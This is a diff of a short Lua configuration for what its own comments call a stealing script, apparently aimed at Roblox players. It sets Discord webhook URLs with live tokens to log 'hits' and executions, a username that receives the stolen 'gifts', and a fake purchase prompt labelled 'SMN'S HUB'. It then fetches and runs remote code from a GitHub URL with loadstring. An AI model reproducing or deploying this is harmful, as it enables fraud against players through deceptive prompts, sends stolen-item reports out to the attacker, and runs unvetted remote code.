@@ -1,5 +1,7 @@
-LogsWebhook = "https://discord.com/api/webhooks/1322394251178545214/It8UlLtT3V7GQ2m_2t1kixM7y6CG1g0JFZd7RoHMNqLuWxF34BiBlvDujqsQGZ9VHS_D" -- << Webhook for hits
-ExecutionWebhook = "https://discord.com/api/webhooks/1330667470452822187/d11E_sz-FZaV-CKlFCO2BOPTEueRvir0WOzFRIv7XVtI6oSu1YqKms4DV1a8TCwOulTH" -- << Webhook for executions
-Username = "Thegroup41" -- << Ur Username
+LogsWebhook = "https://discord.com/api/webhooks/1322394251178545214/It8UlLtT3V7GQ2m_2t1kixM7y6CG1g0JFZd7RoHMNqLuWxF34BiBlvDujqsQGZ9VHS_D" -- << Your webhook for logging hits (Once script steals something)
+ExecutionWebhook = "https://discord.com/api/webhooks/1322394251178545214/It8UlLtT3V7GQ2m_2t1kixM7y6CG1g0JFZd7RoHMNqLuWxF34BiBlvDujqsQGZ9VHS_D" -- << Your webhook for logging executions
+Username = "thegroup41" -- << Your username, basically where the gifts will be sent onto
+PromptText = "SMN’S HUB" -- << Purchase Prompt text
+RandomizedPrompt = true -- << [BETA], makes unique prompt UI, so each someones executes - It'll look different
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/DrubGrub2/coding/refs/heads/main/Script"))()
